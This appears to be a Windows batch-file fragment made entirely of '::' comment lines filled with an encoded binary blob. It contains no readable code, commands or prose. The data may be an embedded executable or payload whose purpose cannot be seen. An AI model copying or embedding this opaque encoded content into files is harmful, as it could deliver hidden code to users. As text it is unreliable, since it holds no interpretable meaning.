::~~~~~S^nYk~~~~~fLwDV~~~~~yTjU^~~~~~Etq0=~~~~~wXm}l~~~~~HkL=(~~~~~VO{nM~~~~~[#Bz2~~~~~TXd={~~~~~3N@_;~~~~~#Y?-Y~~~~~h{1m+~~~~~Ct_W!~~~~~-Lb[$~~~~~?^K]R~~~~~wN~Z{~~~~~O2|I,~~~~~
::s#2)8~~~~~!,_!t~~~~~TX,&f~~~~~)]s(g~~~~~u{Q9q~~~~~rO={,~~~~~l,0OO~~~~~Cteq[~~~~~nX#3A~~~~~G{faE~~~~~~~~~~~~~~~0v9VEAo)+h}nlCb)?oBx9KJ4@3wSW)|S#cy|t6LlmXO3n|SZ6q[G?t6~~~~~0v9up
::9$|g2cY}6@).G/@WExdLcY}C#0vz{8~~~~~0v9VEcY}E&tLqR2cYMk/|S#cy|t6LlmXO3n|SZ6q[G?t6~~~~~~~~~~~~~~~|Suu|MEfti3T8UStLZD&cYM#13R2pj9KJ4@3wlmSmXPvBtLZM^Qoq82A@UDYt36HvAo)h^tLZWo9D(t=
::tLZH#A@4h|~~~~~~~~~~|Suu|Q@!/V2S7GY9D(@$cYM#13R2pj9KJ4@3wlmSmXPvBtLZM^Qoq82A@UDYt36HvAo)h^tLZWo9D(t=tLZH#A@4h|~~~~~~~~~~.L^G!mKr;G).GG/9D(ZutLqbq)^@mh|H?[BA@;$M9Dki@cY}}9|SuA}
::Ao)a&/YTRV}6s.[).G-u3wo!@|tBn8mKr;G).Gs|9$|g2cY}6@).G/@WExdLcY[S!.L^Q.).GI=A@Ufh~~~~~/YToD}ZAg1cY}gz).G-u}nlCb)?oBx9KJ4@Qo=cD9KJR#3RthZ~~~~~~~~~~/YToDTRYuV2S7D=c1iOT).G-u}nlCb
::)?oBx9KJ4@/YToD}ZAOsA@Ufh3R2pj2SY{O9KJ~zcY}C#3wo!@}nSm7|S=]Fp?y?D~~~~~~8}NQ~TT;p}nSm7|Sq,AMEL(Y6w+fZMEL(Y6w+0tQo$wGVX407;R&QI~~~~~8dy9a~TT;p}nSm7|Sq,AMEL(Y6w+fZMEL(Y6w+0tQo$wG
::VX8{wMEL(Y6w+fZMEL(Y6w+0t}64|#VX407[@MS|~~~~~/B6YV~TT;p}nSm7|Sq,AMEL(Y6w+fZMEL(Y6w+0tQo$wGVX8{wMEL(Y6w+fZQ@X[ez.8AI6w+0t}64|#VX407~~~~~6Rq/t~~~~~#9Xs~~TT;p}nSm7|Sq,AMEL(Y6w+fZ
::MEL(Y6w+0tQo$wGVX8{wMEL(Y6w+fZQ@X[eTwfI5z.8AI6w+0t}64|#VX8{wMEL(Y6w+fZQ@DCh6w+0tTwfxNVX407TRYMP~~~~~n4rvF~TT;p~~~~~~~~~~}nSm7|Sq,AMEL(Y6w+fZMEL(Y6w+0tQo$wGVX8{wMEL(Y6w+fZQ@X[e
::TwfI5z.8AI6w+0t}64|#VX8{wMEL(Y6w+fZQ@DCh6w+0tTwfxNVX8{wMEL(Y6w+fZQ@DCh6w+0tQ@XH{VX407A@UxJ~~~~~|d-cm~TT;p}nSm7|Sq,AMEL(Y6w+fZMEL(Y6w+0tQo$wGVX8{wMEL(Y6w+fZQ@X[eTwfI5z.8AI6w+0t
::}64|#VX8{wMEL(Y6w+fZQ@X[eTwfQl6w+0tTwfxNVX8{wMEL(Y6w+fZQ@DCh6w+0tQ@XH{VX407~~~~~3R2!S~~~~~CirFf~TT;p~~~~~~~~~~}nSm7|Sq,AMEL(Y6w+fZMEL(Y6w+0tQo$wGVX8{wMEL(Y6w+fZQ@X[eTwfI5z.8AI
::6w+0t}64|#VX8{wMEL(Y6w+fZQ@X[eTwfI5z.8AI6w+0tTwfxNVX8{wMEL(Y6w+fZQ@X[eTwfI5z.8AI6w+0tQ@XH{VX407]$BEb~~~~~@F8gY~TT;p|Suq.Ao)IxcY}LZ).Op^cY}C#~~~~~}Z2iH9D(@$3wo!@XLx!&|H?[B}nliO
::3wlVo2S]EAWEJ[62S]EA3wlmS~~~~~|H?[BTTV8@cYM4(2S]EA3wlmS~~~~~Qo=cD9KJR#3Rte&).O&d~~~~~~~~~~}nlCb)?oBx9KJ4@Qb+!AAb{W=~~~~~}nlCb)?oBx9KJ4@}Z2dp9D(T79DkdQ).G-u3Rte&3wl|ltLqR23wo!@
::~~~~~mXPvB9KJT))^@]ItLZQxcY[S!~~~~~~~~~~~~~~~0v9hPcY}@2tLZ[a).OzSWEx8=.La^P9KJXttLZGZcYMk/Qoq823wl|lcY}v]0v9U-)^@)l3RthZA@Ufh}ZAOsA@Ufh3R2pj2S]t}cY}Ku0v9U-Ao)h^).OzSAo)a&0v9U-
::2S]EA3wlmS~~~~~~~~~~~~~~~~~~~~YZM0EX3z4Bz.4?v1EKx~!SJxjDY94kX3TiXz.4?v1EKx~!H(Ax1EKx~!H(AxDY94kX3T5Vz.4R]X3T5Vz.4R]X3T5Vz.4R]X3T5Vz.4R]X3T5Vz.4R]X3T5Vz.;{=~~~~~mKoR-~~~~~mKo^5
::~~~~~mKo3e~~~~~mKhN^~~~~~Qo$[C~~~~~TwCpw~~~~~TwfxN~~~~~Q@XH{~~~~~}nr[e|S=]FMElEf~~~~~~~~~~~~~~~~~~~~LJrM@~~~~~~RR6G.LuVycBofOc[z[C~~~~~LJrM@~~~~~OnN/g43cUMoF!M(oy+rl~~~~~LJrM@
::~~~~~PXgcV.30Uy{9v96{06ewQYG(l}v7m3X&y)c=q_],~7XA=~TT;pcn{XItBh(H0rq_y3fe?.0SjV-YG,M/[Aeo|cafid)87^v3CMWxWS}H-t,U4VD?h@!~~~~~~~~~~~TT;p~~~~~~~~~~~~~~~~~~~~~pS1!Cn52=Di8o=)/b|9
::C-vZ_#TBYHDi8o=)T-l9~~~~~@?m?{Mv2C{Di8o=)TEs[~4Nq{~~6gGDyy5s)2@)u~~~~~~8OhCcgRsmD?-$[)20V=cBofOon=V1D?-$[)2@W9Y@kU[ts+?68ejnD|Si{bDi=?/)20V=~sZjF+bZKjDyc2B9Di.gns4]a.3MP,DyD,2
::~~~~~~UMd1?3G~,D?h@X)20V=~1F?TsSc_x|d]^@~~~~~~X9X_WvmlA/uxnx~~~~~WLxy;43cUMDyy5s)2@)q~~~~~ZXpG043cUMDyy5s)2@)Z~~~~~^^tg&~~6gGDyy5s)2@)#~~~~~^^^.^Wve4]Dyy5s)2@)v~~~~~~[4QE@nJX1
::D?EG&953LI~~~~~9Pr$pU.q^AD?EG&953LL~~~~~~~~~~~zcwXO/L8nO@@0nG?Ti$8qp~J8WE#G8$8F.HLz[YPAR@5{G~fw~TT;p]6alEC,Da-~TT;peXWp?~0CPt8oYpFPC9CtOWoidG9]LnpS1!~~0CPt8qp.S8$QU=8WENU8tWg$
::H.PJ=sHRI_sO8SR48@]5P{hjpO@gQoGxoMh{G~fw~wwTOcNdRo{zPGN#0&pT~~~~~XV@EOk~e~$~TT;pk~e~$Hq~+SUh;Z,~TT;pUh;Z,~Tw^;G44Cc~Tw^;pb}}}~zcb!OcH$#p3BYZ~_{^aUh~L(VCld}8pTYNHtp+apSv~B^7g@W
::phKbR59S]vU^qvA~.zz{^7g@WphKbR59S]v~zcwXO/L8nO@@0n~z^s[O?c)?P4NVj~zcwXO/LpNOQF8]H]7j9O/LziO)X-^{G~fw~TT;p}MK+8JL4BM@?m?{~~~~~~Tw^;GGhq~~9DOv1n+Q,1SE@v1_X!91RP{d1vJ8D4nBE!~zS[B
::PM_f~PXm8cGH5ut~Tw^;Ggy|{~z?cmPEz(GHUJ~)G9]{B~ZvAsjGsBsPK,kxp8[!1UJc1=Gn,}[C-vZ_6GQuiSqHQ;U^q$tC-vZ_6GQuiSqHQ;~TL34p9T8N~TnZspLkf)~TL34p2I@[~0We04uPr&4Z0qc47i6b4^kGY~~~~~~TT;p
::~~~~~~TT;p~zcwXO/LV-OtfJB~0EVA8KxBq8C[i18(41K4Hj07PIw$_~TL34p9T8Ns80iy8W,Z@8tWvRH)l!KPUG@kGS=GxGGW|p/D[Us+b3LR~0opt81v&H86!HRH3pH)PsT6+OpUO/~z^s[O?c|-Obbx,~0GW/H}4szH[jdFHTrY9
::~z?cmPFWftOTV41pogMr~@Q=7;U^Yj;s,|W;H7~H;H/tG80?y&4GMH(~0EVA8+Tk&8KJec8C[$b8fbKu4GMH(~0EVA8+Tk&8KJec8C[$b8fbKu4GMH(~01xTHhS{8OKA@TG7l=lp2qzV~_{^a~0MhTHESMzHn.,iHn4kBObCal~0GW/
::H}4szH[jdFHTrY9~0bB3sX@DfsVj~vs1i+9ssqZ(ssQwt~z^DBO?c|-Ow&9qG9]{B~Tw^;pb}}}~0bB3sX@QKsVjgJs1i(AssqrGsXg7g~TL34p2I@[sHn_hO?c)?PO2,//D[Us/1wxn~zHR;GZ0lL~zDL1G{1T3~zcwXO/L8nO@@0n
::~zcwXO/LpNOQF8]~zcwXO/LpNOQF8]~z?cmPFYP7PEzJyPwwPk~z?cmPFW(YPEz#EP?Zda~z?cmPFYU=PEzriH~9T0~z?cmPFW(YPEz#EP?Zda~0EVA8+zO^8KJ-28C[&p8KA4i4GMH(~z?cmPFYP7PEzJyPwwPk~Tw^;pb}}}~TL34
::p9T8N~TL34p9T8N~TL34p2I@[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~TTme~~~~~~~~~~~~~~~43cUM~Rj[@~TT;p~~T?/~~~~!~T3XG~~~~HHCIy6lSB@m~~~~~~~~~~TwfxN~~~~~~RR6GHg[f[~~~~~~~~~~}64|#~~~~~~RR6GGvj?;~~~~~~~~~~
::Qo$wG~~~~~~RR6G~~;4p~~~~~~~~~~/YQL5~~~~~~RR6Gz.D2P~~~~~~~~~~Q@XH{~~~~~~RR6G|SJ#w~~~~~~~~~~ME{,f~~~~~~RR6Gy1Z)N~~~~~~~~~~|Hy/?~~~~~~RR6G@nl}g~~~~~~~~~~ME{jr~~~~~~RR6GU.QYt~~~~~
::~~~~~}64=J~~~~~~RR6G8S{J|~~~~~~~~~~}68~C~~~~~~RR6G71?Rq~~~~~~TT;p.3mb-~~~~~~RR6G=S]7J~~~~~~TT;p|Hy[,~~~~~~RR6GyB6uX~TT;p~RR6G~~~4G-jhS8~TT;p~RR6G~~~gPn8;nb~TT;p~RR6G~~~.sK=v~,
::~TT;p~RR6G~~~OpCFpVe~TT;p~RR6G~~~~!{9YQS~TT;p~RR6G~~~p=ldyYJ~TT;p~RR6G~~~~{_B@Jq~TT;p~RR6G~~~~c!/Thj&BcmQC~Q]@tP}-_~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~pS1!8AOvYyBRKl8I@o]
::3zL;qie!hK#|xtELpZUZUcA+.npY85{F#NJgFkrc5|+&?m+Ep8/Mt6C/D[Usc7W!)|eFH-^WmW1L(_&a@wOfHC-vZ_6GQuiSqHQ;6GQuiAHT}vfhD~|AHT}vM?thHn8#UZ|LX}M83;/&2e){VUQ(BrKWjIn.q03dnG[&FH=P[^WhcsQ
::UTNdCs4SUSuhQHRUTi5diL?+01h7UQ~OFJ)KYN=(MhqVjnOc94]5ugFgF5J97X-}wBzl26$qs|)MJbNmnr-g!T8d[-MxTO|L_VQEj9w^?y!#fca+=g3!erE=^7g@WphKbR59S]vphKbR0Fbtr?=KD{0FbtrWF?9p4q7$17[V;sy!5(A
::Je2{Ny!5(At7^xN8ejnD3HV]?FI76uNeVx]@?m?{$KHn!38N}6#0&pT^7oS=eB^Cc~1F?Tc?]Iq~s6)ytv;F#inO6MGhf|~inO6M&w73VDM};3{A+!rWt6L{6s4cv$v9Uya?jE6|el?n^v|sM[$S~pzc/fF.vlz/H.e;aYF{a9H.e;a
::[N0THuhA1j6gh340ti[$^qM2d0l}Q=[=M@4hh0s(6g-vs8#Y1lle)eD85CMIR]pJ)Ne9f$j3ki]2BO~S?qGQC25o6IgPWkFOwgdHVpA.(-lRjM1hez0-lRjMn]=(D6sXW&5)]|[x=ed7/M.gfdp[M(&pWcz@Fi_P^a~B35f~#M3sOtM
::-lw5/neV|6WhaMz5)d=MGs;OR#cMCJGIL}hYPCBbvFdxS]pIuGHwOcdjcDLF4aoaK2MsSNoFl^O2-I?nSmi|CSq/W1Sa}2di-cf${csl/i-cf$X?GLDeB?bA!-bH[q+I.Bn8{muZDPtMexz1syBnwLKa.W1/Q]}W~s3&i/Q]}W#fLbQ
::HMZ.UuISQ0Le{oFUcx(Q{WtEksnzJF6s.qazY3=IWsb_8zc7yk~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/QOmN/Tp9Te1^WzZA8^@w(hUZk/uR=.]8f_4d8NHkPHUh^31G,/Tp9Ye1^Wz$(iBnmsQ3&.]8L#qO|Ruk/R;}lk3H_/TO|NU^3[ACnzOfpe#SvwwWo]pK=0okPPd_6ML({/QJ&kGh.eN
::1a6q4)T+Ss/QO/;76cH}k/Z4fqF=rriEpS}qkM@K-_=BbkPH4O1fu1Q~8Q{N.^gFlq;wJa/QngYvn];dqF!)J},#LIq+39Q~~~~nqiBe=},#]A$Yb@&~~PN21Jea81I15i~Djs+U^3DknRHi$qdVZ//Q+|Xt=yH41SYQ1Ls4Nh/QJ&k
::Go5v=EF,tR~Icm4/Q,|dp0d5o]yM75GhlBW1SYQ}TOoD9j|h)B$(FFYqfW2//TO&?W54Dr~~Gv7pJnSRkOxCz1lQ-TGhlBI1jzdaletan1xrMU1JLjLqUKXQ/Q-N;~~6gGw(a-dk/&eNW^?+0}#/^=1SYQB.]sy44bDsikPHHc1j9|@
::w(h2Jk/api/QNlb@F0iN|NI1{iHu[.pCWh=qO~c#p3h}}MyY0z~PPV}k/ZY,HBsgviHuW9Gsh__}HMvo/Q-ARqg8OaqVdYOMblgqMbi.v/QO/7/Q5nG+b3LR/|(Q9~D,i8lSB@m/|wM+m0i_!qwm~SF)E+6.yNt;P,hN/W&2Fn~~4+~
::mX;cN/QpvGKA-,#~gt/vqih8&ZO&OJ~~GSu},uPSK3QXa$(Fk3-?.l8~8Ls21j2a_~RRBh},uOw~dD?lqn/FV~~~~,Z7H&S~~~G!~TT;p-Sr#Q~D?$LllEm^~~~~nqn/iC~~~~nZAFDN-57$#~8I{^1+Z8k~~PUG/TO|NzvE!^~~Gv7
::ZOuxg~~Gv=TOh^X{/C[@/Qn3uKA-,#/TO&?zv5?6~~PwX$(yB^$LAsvq{aNJHPm3t{/C[@xbSxZL4f1s)T5/vp9mk(Py!|r|?)j!r&Qt@PyBv!Z7Ha/~~~~Kqiz-q},#]t.]sGjqimsi1J~UPU#|GeqF3{~WxI,$ZO&TS~~Gv=TOjL,
::{aEDzqF3{~WyTZsZO&TS~~;O}1NYc+E#gmc$]G]J~~GvYGpjI]1j2vt~~~pRIf@Pi1SY0M0QDj12YUyA5O9OT@.F5I0rWzELwoQt~~GvY/dZ0h/QOmRiHuM|OFv|7GR4iD4i,D3kPPd_Vsj.v/QJ&k8K{JTMblgqMbi.v/|Ngk~~~~n
::qo5{qk/uxWL8MLT1nchH~sDTY1op=c~HZcOqk6oNid2H;.^D)BqHrdmB6ql7}H@]vZA8Jt/TpcQe1^W}_D0/7~Hq{_}-KxOB[xaKwwTO~My2A~P&2R}Tj+7Vr&=o?HPMB0My22yPyVGQTjx01rJ4Q1HPMdqMy2W&G~ndD)i;jn1_ROV
::1rC]V1o,Y-},uakq1hL-mG0V?MjlYH1R7MZPoU).Xq]YX5#zDD/THv&#/?m__N]]j~Do8$VG3O-Uvbf0k/uR7.]U5zk8m1G1+wcp~8ANf/THno#/?m_}i835g|51=1I15i~8cSC/Q^IrXqPX-1SYQ[},#X#qXiv--&az1~|89yZ7?gM
::~~~GI3pL6#{OI!E~RR6G/QNVeWL!Ma4FTAYkGSUC8et&T1I15i~8npq1h!GC).dlE1S7^D~DyLCqn/F0~~~~n!j1H?^L0OIq5bPj~TT;57SVOj~~GQE}~CnI}~&C4@1#y!!xe+7/Q^xTq;x.OMy7Ez4o/Dz.^Vr(qg2}CTLI&dMbN6#
::}~OJXEi;bFiV!1T/R@;]mGTo,qDn-nqDnIeqD5VFqD5Q~Z2)p9Z0.]_k/uqA{r+@r.?6wO/x?NM-J&0]~4wSdqF20!!S&Z-YyV{W},#Y^Z23FmhE^f&GR4ypp6zG,$Yb?f~~GvY},Z?^4iOvTk1M#FHBH2b)J=,po,Qpz~~GT2+)Zub
::1xxe#C@4z7dK!PtfMI$gBM==1d7km]/Qn3uvn];d/ZhB0.[8zb1Ln~U~8L;}1Ib)G~.Nv?~~GQYLKH]rZ[}=a~8/K&1Ib)G~gcn3qn/i$~~~~^dK!4Y{?AA1Pyqx61{_v6~V(dL/Q^+t.^QNZ/Tp0Kd7kM/!xCu0C$YQS~~GQYLKH7k
::pf&TdEZ$&.{s(TaZA2;xZ0QX}k/uqAldk2D--0xN~4wSdqF32_$UcUZpruM5)hOBW|A@@o8Hbh_kO_Lo/Q-dRC-OXRMk;s3K&;5^PNI7&Mk;1Xpra84EvKGo|24Z&C@4z7dK!Px{?AtDqsaUfW}N^yW}2T5WmrX~W/1(v/QnbL71Kv=
::/QpnW}~E?{}~oCS@j9OJ.^Vr(qg2}e/QOm?}Pl.r/x|2x~4b})p.|L@@-TT8$BGcy/x|=F~8+Kv-vp[}}vekhidNzk.?xdI}U@iF~~4ai~p^4Oq;?FoME2ol$(yB^Ib$CQ$mpFu~dV|XqfW2X.^Ql-XqPXT3}y&{}U9dB~RIW(HgsSO
::qfW2XqF7P3yc(hX=pN+K/QNVeXqP1&-f7UxkPHHc1xhDDEoV&&!S&Z-)L.V-Eh$mv}aqH+Y,3ck$0/zYG7}3s~M&yi/Tp@.CnzG.qi=^PPKC^KKaVUC6sGTp1r{XH4dq4skPH4?{OI!_XLx!&-r(c;~D?$Ll5OxNZ2MPp/Tp@gCnzG.
::qi=^SP$Y$eK=JFYw(a-Sk/api/QNlb|e}MRMrx)v.^Vr(qg2}RqD;o8/QO/;/R@8r/Q,zM!RL4clFsL!PKK!j}Ce]aFb@ru,Mw/(Z/z#m~D+G#NHq82Z@;C;k/u!p)_M[{},vI0Z2T-}hEvoD/Q-hlq;wJ6w(Ruik/u!pYE-yQ.]U&M
::dL[ZpNHq4v~~~O~4,ypOk1VP_NHq;TOfg}T~~Pno/ABP2/QNVeWI0fE/TOpIMhsAa+U6c51xxC$4{wzekO_LC}Ut1oPKKVR2{|3pqgqQ$/QJ&k3.u5I~~Gv7.]U-9KLs_6{/CXO+XIU#qf{Rh4N4q|kP70YGh.-]1jzyr4dqO8kOzgk
::~~~pJ},Z?zil]64/QNVeMLz|i4N$fzk1BCCqdVZ//Q+|Xt=,C?|NI1{/QJ&kGh.eN1a6q4)T+_o,mnq-/QE!Kq8p9UXqPOg.^V|Eq?Kv-X,U2Y$}rZ2).C3!WE+s5G(SCdpc#KkE#rhNXEdh}$D-k4O6!HU)iMWN~~~~eq?W~ocnypv
::PQ8mK6Y-Sz_Hls)E&&x{H.J@u$AmLvPx29NmjGU$_H{6d[kxsN$A/-FVQpMgciM]!_H{6dzOIfrHOZ+uI;=Db3_$y0le4Xi~l&9U~WB)B)KP-ifHe&wqOiK?~~~~KqOOQ10JXaWqe5jq/Q+&/8w7D)EN[50/QJ&kGh.eN1a6q4)T+Ss
::MblgqMbi.v/QOm#/QK7wqS(nvy#a&k1I15i~8LPzw(&TXk/u](r,i=oz.F}vDXdWt-SJ/2h@R0(}Ut5s}Gz8B~~~~fpM7NLmGJkt4?J4[kP79m/QB5PG]i6H~M&yF.?]P7d&SQQ-J[ebkPDU{.?YFSqi|7gv[N-@d&SQtc5q/o~w5~T
::LR1kBq8xcjw2ngV1I15i~8QLM1S=Tw~~~~nqi]MBw(xSxk/uR70J6g|qe5h9/Q+&/@F0iNU9X9G@.F5I0ru2,/QJ&kGh.eN1a6q4)T+SsMblgq/QOm#.^|xcKsufcqk;n,nlK~(!hh$owtbv}Gh.5n/Q-dRr2v0Q$(Fd]k[VtrL(6yG
::GSe?5$gxSt/QxY+!xnT~qi?X|~~~~npBt7y.rkuQqO(jFqfqh1/TpTh/QJzY/QNlbMhgK=1h!]{)T5r&$0_Eb0kxIHIiO@$/QJ&kGh.eN1a6q4)T+SsMblgq/QOm#.?]FGqFJlr-Fn@!Zchx4k/uCuDv|!~kOxf=.^.]!/Q-ICZ3pV[
::-aJE!kUam!8tQ3W$0y{_wkRw8/|w1e_/FRqI~zY_ZtA_xq{r=j/TOaQ~8npS1j]4!wTZ)Y4jc5d~RZ,6LR1k-lnSnu$g=tl8V{0e/t8RD/Rg&Y~8Lp&/Qd^j/Q&)sldkcN1jzyh2{QutqKlB9/Qpn4}~oCS@C!U6Mo|oLzOSe#T24h#
::zP]b!z9WPW.^D!gqk;n-6l7{16IM!l}Hh7Uqk~C5Y,A/YcPQ&z/Q^f//6zI6O)NZ)~M&ng~wwTe_Ysr!~8K/,)xEiq/QGP{/Q,9Ryb-JhdmW-!/T~{)EZtf[IG@ESmXGR6kPH4C/6|sR)~UG6.Ladj64[}dmXAZmG_7S$U9gZ1FUgV&
::~I0A+3?{{^fKy.kioULGy5!Ur~l+FJr&TB.Pb4X7~~GW=-tV8kB.G+)KLAg&lt{K0~8pUyc#!1bq?e2=iZ/yFqF9(AKhrrN/x?-./Zj(mzbB/-qOv_[.LRX}~I7Q3~8QRN~AD[A~UF8M~I7Q3~UyRJW,OSk.LaCyqX^Tn=HF0^_Wb&D
::~8[IkWDT/2pm70/PyWnce#M0Rw(Jppk/uo]mXGy9{sF{4&$;@4-b9Cf~s/tn!j_Nu{W]u^xbve(-&j~okPD1$~}14c/RgpQm0izk=5DFEq{rxjqVCwlq{rxjmG@g-/RgpQc5+$GGp|R7Pb!GL~~4f2~~4KGqk5H5SY5gq~~sTK/QpeS
::cFZDK)a.z~Bp1Ba/QpeScFZDK)a/mf8~p7kkOzgF~~~~nqi80OrK@9yB6P-CuM(jL/QpeIEZtf[Io)WHB~/hzcFZX1PbGg1~~GvtIo)WHB~/hzcFZX1)R6E8Io3UCi2AkK~TT1X~RR6GEPtO|~8I{r~f&4YU3rTZZ7H&e~~~~nZ$fS,
::~~~~nqi8TFwQodIB6s)rOL-xj~~~~nq+39C~~~pJjT{Wz~~sz..^zSZ^3pwE/THno_1o=D/Q-r^)aCPQ/QngY_1o=DqE_!k~~~~nB[oVqcFZ4s/QE12#vNL{k/aG#EGO7GkPPdr~f&4YU3rT+$XsV;m7t@;Io3cS-v1+5MkUK#$kl,_
::~|4fh$0&fH$X8[(iVJY}1jzyrTOhp;qi8TewQoe^y6$VxPbGwt~~Gv70J[&UBMhV~cFZDK)JFGFIo)WHB~/hz/QJ&kM_0j!VTaRSqfWte/QpeS/Zhm@XqPO?1xxZtLlEs&1C2_2~4wg&mMZPa!xen/1JC}tCHO}lU&p|Zk/aGYMk;1X
::VQp[?V~MhL$0&{xk[m0K-Hx!p!S])al6.uRI~Qcdion4tiYly/)|FX4.Lvb(w(&^!k/uKq]Dw&$qy2z}~~~~5q{rxjqX$;Kp+-3W~M#ZB/QpnI}~E?{}~oCS@j9GtIiO@$/QJ&kHB+j?1^i1+Mbl2gEE_Iv59u|p/R[e1q4MT3U&.DO
::$09xO$D-Hwi!cFQm~HrAPXg2AEj5{SWENO=y5yA=palJ+kUt7@cFZ;@)J!Z5IGfVh,Nq,=},u^pZAFDN-+Ypmk1MqFB[CmS/QK-SQ~a}^$0muG$D{bFi!@SvU3^XYPXg2A/QNVeMhBHS).5_Zw(^|Lk/api/QNlb/B_h^1o,^nLGF@Z
::@j2R9q{aNJ/Q&ug]Dw^n/Q-ARqg8OaqVdYP/QO/;/|(T-~8nUB!S=Gn6sGQkUc9fC{v#30k/aGX$(FF)Z)sSRZA8^WqiF_9MK~)p.^s|{U9F7C1JCsQ{fy&]4K6o;kO&210JBuQY,3o2}5r;AVauNn1SYQ}.]sGtdK!PpIG#),TOo3$
::_MvkQcQeh[4(|iRkPH82/QB5PBqVOl~MqgjY,tNm)|2d~.]8L|dK!HvlcyB8=Ho}H!j_NuCnBL0lcyB8qe5huq?DsA0J6S7$0layIf@Pj1SYQ}.]sGRqix7zheJMTqF3{~Wd4Ik.]8L|dK!PllcyB8q!GtnI^l}7/Q-ARqg8OaqVdW-
::qDjQHqX=VDT8qoVU9Y{=Gy#=[~Kv0/ZA^{W!ox1CidNzw/6z_[874YJGh3WVc-pdU/^f0(eL{JAk/x2+_Ysr!~8pUycv6{Z8O3|!kPH8Q/Zj-MOQ@|8_z;t(I~Tk7HPQj6qCX,uq?f;}Zw^1]HPT$#q?a3|E_5|{qi0i8q4v3-AGj7m
::!j_NuCcJ@^4waf)k1BCCqdVqS/Q+|X68ak=1jzyhY,A}&$0_Eb0KBeX$g2T+IG_oliQOKuGXgC)~~nabIOpnIHPjM4iQPGxp|w4y8w#ac/QJ&kGoj?1/QOmILR@1wle4]&/QEf~qGlMD},uE;ZAFDW/Q,TA8~)0-kUa}~=-h,X~HZc4
::Z2MO?/TO&?U9y=(1^w8}~AHgiPyMVZ4FQwQkUamM9&bg~1^,sDp1pfb.^Ql-zcBSt1JC62TOog7qiqATcc/;A$(Fii7|HxJ~gcTFf}JeO.];I}Z2MO@/TO&?t=y4gw(aGQk/&eNWau{x1_&!pp1pCpq)/lE=dITG;S8^HqdVZ8/Qpnm
::@j9OJ/YXbblHa1xMo|BUEE_Up/QEVe_Mmg39F=ubZ2j1!pQsX&d&j7K_Ysr!~UF4^~w5~TSL/pHq;+u0ijNWGiR(B^~~4K;$0_,|IiO@$.^Vr(qg2}RqD;h?qDkq;qXN9[T8qoVMj0inMvj$mE.uwnH!fJ+q(Kb8n]Ny13S@j$M&|Hc
::{(wLIdY#[re&+Vs!e.y2rKcNJ|4O~I~K.Q5gF^zlGjiuf/x?New(x~.k/aGXEoMJx.]szJmX~Qe!_Z?qqF3AC}-@{6/QN#^/QNVe6Uf&/},#7q4^38E/QK-S68U|d0J[~-ZA.=2!xC^XEJow{/R!Ks}cr#OHPzFuXa9Vtq;wJQ/QK-S
::68aE?1J~UPXh&qd/TO|NX^B^L4E!7lkPHH{1o,^F)T-}fqNvdLq?DsA0J6g|$0lG90KBeX/QOmNq{aNbq;wJQ.aE)NU9xBXmMq{o8O3mXkPPd_6ML({.^Vr(qg2Kb/QO/;/QdhofE9S}!R[+9},uQiZ2[0nq(?hkK=l?eCF^$,n4)5a
::~~~G0},ZEd~~~O~4iE^MkUamMHFfvRB.^d[qdVqFEZ#dA~~4K-UPxQL1h!YlfnK_Ok/uR70JB/o$0layIiO@$.^Vrk$2~+&q+39$~~~G0},uG#~~~~5qUCB.},uEp~RR6E$B)tZm0?q{q;i7bZ21;Cq1RPbq;ydcqUf43$B2+r.?xZS
::/R@9$mMZP#qi+x@pq)dmmG^S#l5g1@du$G[PbocE^3pwE/QnSj71Kv=/QngYhvUh4/Q&,$q+39a~~~~n$(Fd6qOvA;I{?3bWKVf=.^V_s/QO/;/x/Dd{OIXFX3Q8v}HRZqqUCB.},#LR~RR6E$B);)/x|#t~8nGWK=IHFGhN|W{W_A|
::qFaU)WezpJ$(Fiz/QNVe@F@Ul/QpnR07y_D/QJ&kGo5v=EiUUpKNFP(/TO|NUcP=T-L|^GkUamM1z,eK1xxC]Kt9r@k/&eNWa6SX},Z,WZAFDR/Q-r^6Qw,R/QNlb|e}MRMrx)v/QJ&kGo5v=Ey2(NFUg)(/TO|NUcP=T-R{F8kUamM
::HM/4#1^?j.dyGA2---QjkPHHv1jzyvLPhv./QJ&kGo5v=Ey2(NFUg$z1^?r|KSRZwk/&eNWa~3;TORarq?DsACKnmAk/uR70J[&;$0SYZIiO@$/QJ&kGh.e?1aBO7$t(n?q(40(.]sQLqF=2aib?aZk/&eNW^+bM1SYQ}TOjVCqi]M7
::1JCsQldk2D/QJ&kU^3XySsxeOqdVZ8/Q+&/z9e8IMrx)v/QJ&kGh.e?1aBO7$t(.Iq(40(.]8LuqF=2aibE]$k/&eNWaTRgTORarqipqY{P[g}-jMz$kPHHv1jzyh)T527$0SYZIiO@$/QJ&kGh.e?1aBO7$tb3;q(40(.]s-+qF=2a
::ibnC^k/&eNWR7t&$YbRo~~Gv=TOjlkqiph7},#YRq+396~~~~eq?ac)},#X#q+39U~~~~nqiz-q},Z?zmDdDC/QNlb@F@[(1_^LOLs4Nh/QJ&kGh.e?1aBO7$t(.Iq(40(.]8LuqF=2aibyE.k/&eNWaTRgTORarqipqY{P[g}-Lfb)
::kPHHv1jzyh)T527$0SYZIiO@$/QJ&kGh.eN1a6q4)T+SsMblgq/QOmI/Q+|X34S3#.^VyO$BuGIHPQJ}qkMEXUUwqY}tUsMB/.0Te1^]$qF.C1}Ut{!Q]Sh9m8T6w/QEU-$(FNT_z;t(I~DTV~~Gv=},vW0qipAw~TT;p/Q^IrgF^@Y
